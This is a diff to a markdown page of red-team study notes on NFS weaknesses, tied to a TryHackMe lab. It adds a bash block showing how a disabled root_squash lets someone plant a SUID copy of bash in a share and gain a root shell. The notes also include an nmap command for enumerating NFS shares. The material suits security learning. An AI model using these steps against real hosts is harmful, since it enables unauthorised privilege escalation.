@@ -36,6 +36,8 @@ $ sudo umount /tmp/share
 
 ## NFS vulnerabilities ☠️
 
+[![kenobi](../../../cybersecurity/_badges/thm-p/kenobi.svg)](https://tryhackme.com/room/kenobi)
+
 <div class="row row-cols-md-2"><div>
 
 * It's possible to use `nmap` to get information about NFS shares:
@@ -45,7 +47,19 @@ $ nmap IP -p 2049 --script=nfs-ls,nfs-statfs,nfs-showmount
 ```
 </div><div>
 
-* When **root_squashing** is disabled, a local root user is mapped to the remote root user, allowing them to create SUID files.
+* When **root_squashing** is disabled, a local root user is mapped to the remote root user, allowing them to create [SUID](/cybersecurity/red-team/s4.privesc/linux/perms.md#suidguid-bit) files.
+
+```bash
+# on the remote host, we create a bash inside the share
+$ cp /bin/bash /share/sbash
+# on the local host
+# we give the file root privileges
+$ sudo chown root /tmp/share/sbash
+$ sudo chmod +s /tmp/share/sbash
+# Then on the host, running the SUID file
+# will run it as root
+$ /share/sbash -p
+```
 </div></div>
 
 <hr class="sep-both">
